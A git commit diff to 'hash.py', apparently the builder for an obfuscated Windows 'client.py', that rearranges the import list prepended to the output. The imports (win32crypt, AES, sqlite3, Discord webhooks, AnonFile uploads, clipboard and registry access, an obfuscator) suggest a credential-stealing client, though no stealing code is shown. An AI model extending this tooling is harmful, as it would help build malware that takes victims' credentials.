12e6279a20cc1784294fc7965b1e1c3021b1909f
0xSxZ <57729495+0xSxZ@users.noreply.github.com>
2022-08-25 17:50:43 +0200

    Update hash.py

--- hash.py
+++ hash.py
@@ -11,20 +11,17 @@ print("[.] Created client.py.hashed.py .")
 txt = open("client.py.hashed.py", "r").read()
 open("client.py.hashed.py", "w+").write("""import os
 from datetime import datetime, timedelta
-from os import getenv, getlogin, listdir
+from os import getenv, getlogin, listdir, walk
 import sqlite3
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import discord
 import win32crypt
-import codecs
 import shutil
 import command
-import time
 import random
 import threading
 import re
 import wmi
-import json
 import uuid
 import textwrap
 import psutil
@@ -34,30 +31,23 @@ import requests
 import sys
 import base64
 from base64 import b64decode
-from Crypto.Cipher import AES
 from json import loads
 from regex import findall
 import platform
-from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
 from pathlib import Path
 import codecs
-import os
-from http.server import HTTPServer, CGIHTTPRequestHandler
-import tkinter as tk
 import pyImpossibleObf
-import os
 import json
 import base64
 from addict import Dict
-import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
-import shutil
 from datetime import timezone, datetime, timedelta
 import winreg as reg
+import winreg
+from anonfile import AnonFile
 import getpass
-import os
 import zipfile
 import win32clipboard
 from os import walk\n""" + txt)
